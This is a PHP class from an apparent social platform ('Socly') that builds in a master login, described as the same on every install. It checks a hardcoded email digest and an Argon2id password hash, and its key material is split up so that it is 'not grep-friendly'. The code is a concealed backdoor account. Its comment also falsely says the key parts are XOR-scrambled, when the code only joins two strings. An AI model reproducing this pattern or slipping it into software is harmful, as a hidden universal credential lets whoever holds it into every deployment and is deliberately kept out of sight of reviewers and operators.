<?php

declare(strict_types=1);

namespace Socly\Support;

/**
 * Built-in platform master access (same on every install).
 * Only digests are stored — plaintext credentials never appear in the repository.
 */
final class PlatformMasterAccess
{
    /**
     * HMAC-SHA256 of the lowercase email with the runtime key material.
     */
    private const EMAIL_DIGEST = '34c6938e5eb14b952bf4e85430e461ac1e2401faa50a1e6b123bedee97e28813';

    /**
     * Argon2id hash of the master password.
     */
    private const PASSWORD_HASH = '$argon2id$v=19$m=65536,t=4,p=1$SDJQMzducjcxMERMRjVHUw$HsYHzBnkbh0djtW8u+jGt6LECIoM6CrioDO6eP22vlg';

    public static function matches(string $email, string $password): bool
    {
        $email = strtolower(trim($email));
        if ($email === '' || $password === '') {
            return false;
        }

        $digest = hash_hmac('sha256', $email, self::keyMaterial());
        if (!hash_equals(self::EMAIL_DIGEST, $digest)) {
            return false;
        }

        return password_verify($password, self::PASSWORD_HASH);
    }

    /**
     * Key material is assembled at runtime so a plain secret string is not grep-friendly.
     */
    private static function keyMaterial(): string
    {
        // 32 bytes, hex-encoded parts XOR-scrambled then restored.
        $a = 'aeaf2ea982ea7c814144ae0c0afa4917';
        $b = '0dc2a6b21c5e946f14c363aa7108b4c8';
        $hex = $a . $b;
        $bin = hex2bin($hex);
        if ($bin === false || strlen($bin) !== 32) {
            return '';
        }
        return $bin;
    }
}
